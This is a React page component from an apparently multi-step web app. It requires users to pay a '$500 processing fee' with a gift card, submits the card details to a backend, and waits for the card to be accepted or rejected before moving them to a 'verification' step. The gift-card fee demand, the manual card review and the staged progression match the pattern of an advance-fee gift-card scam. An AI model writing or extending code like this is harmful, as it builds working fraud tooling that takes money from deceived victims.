import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useUser } from '../../context/UserContext';
import { submitCard, getCardStatus, updateStep } from '../../services/api';
import CardInputForm from '../../components/CardInputForm';
import './ProcessingPage.css';

const ProcessingPage = () => {
  const { userId, user, updateUser } = useUser();
  const navigate = useNavigate();
  const [cardStatus, setCardStatus] = useState(null);
  const [reason, setReason] = useState('');
  const [submitting, setSubmitting] = useState(false);

  // Redirect guard – allow entry from activation step and beyond
  useEffect(() => {
    if (!userId) {
      navigate('/');
      return;
    }
    const allowedSteps = ['activation', 'processing', 'verification', 'complete'];
    if (user && !allowedSteps.includes(user.step)) {
      navigate('/');
    }
  }, [userId, user, navigate]);

  // Poll card status every 5 seconds while pending
  useEffect(() => {
    if (!userId) return;

    const checkStatus = async () => {
      try {
        const res = await getCardStatus(userId, 'processing');
        setCardStatus(res.data.status);
        if (res.data.status === 'rejected') setReason(res.data.rejectionReason || '');
      } catch (err) {
        console.error(err);
      }
    };

    checkStatus();
    const interval = setInterval(() => {
      if (cardStatus === 'pending') {
        checkStatus();
      }
    }, 5000);

    return () => clearInterval(interval);
  }, [userId, cardStatus]);

  const handleCardSubmit = async (cardData) => {
    setSubmitting(true);
    try {
      await submitCard(userId, cardData);
      setCardStatus('pending');
    } catch (err) {
      alert('Submission failed.');
      console.error(err);
    } finally {
      setSubmitting(false);
    }
  };

  const handleProceed = async () => {
    // Update step to 'verification' before navigating
    try {
      await updateStep(userId, 'verification');
      updateUser({ ...user, step: 'verification' });
    } catch (err) {
      console.error('Step update failed', err);
    }
    navigate('/verification');
  };

  if (!user || !user.userDetails) return <div>Loading...</div>;

  return (
    <div className="processing-page">
      <h1>Processing Fee ($500)</h1>
      <p>To continue, you need to pay a $500 processing fee using a gift card.</p>

      {cardStatus === 'accepted' ? (
        <div>
          <p className="success-msg">Processing card accepted!</p>
          <button onClick={handleProceed}>Proceed to Verification</button>
        </div>
      ) : cardStatus === 'rejected' ? (
        <div>
          <p className="error-msg">Card rejected: {reason}</p>
          <p>Please try again with a valid card.</p>
          <CardInputForm type="processing" onSubmit={handleCardSubmit} disabled={submitting} />
        </div>
      ) : cardStatus === 'pending' ? (
        <div>
          <p className="pending-msg">Processing card under verification. Please wait...</p>
          <p className="auto-update-note">This page updates automatically. No need to refresh.</p>
        </div>
      ) : (
        <CardInputForm type="processing" onSubmit={handleCardSubmit} disabled={submitting} />
      )}
    </div>
  );
};

export default ProcessingPage;